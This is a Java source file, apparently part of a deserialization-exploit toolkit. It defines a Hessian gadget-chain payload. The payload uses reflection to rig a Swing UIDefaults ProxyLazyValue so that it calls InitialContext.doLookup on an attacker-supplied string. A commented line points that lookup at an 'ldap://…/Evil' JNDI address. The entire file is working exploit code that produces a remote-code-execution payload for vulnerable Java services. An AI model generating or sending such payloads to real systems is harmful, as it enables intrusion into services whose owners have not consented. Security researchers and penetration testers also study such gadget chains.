package hessian.payloadGroups;

import gadgetFragment.Entry2EqualFragment;
import hessian.PayloadRunner;
import jdk.payloadGroups.ObjectPayload;
import util.Reflections;

import javax.swing.*;
import java.util.concurrent.ConcurrentHashMap;

public class Jdkswing1Group extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
//        command = "ldap://127.0.0.1:8087/Evil";
        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        concurrentHashMap.put("aaa", "an,");

        UIDefaults uiDefaults = new UIDefaults();
        Object lazyValue = Reflections.createWithObjectNoArgsConstructor(Class.forName("javax.swing.UIDefaults$ProxyLazyValue"));
        Reflections.setFieldValue(lazyValue, "className", "javax.naming.InitialContext");
        Reflections.setFieldValue(lazyValue, "args", new Object[]{command});
        Reflections.setFieldValue(lazyValue, "methodName", "doLookup");
        uiDefaults.put("aaa", lazyValue) ;


        return Entry2EqualFragment.getEqualTrigger(uiDefaults,concurrentHashMap, 2);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jdkswing1Group.class, args);
    }
}
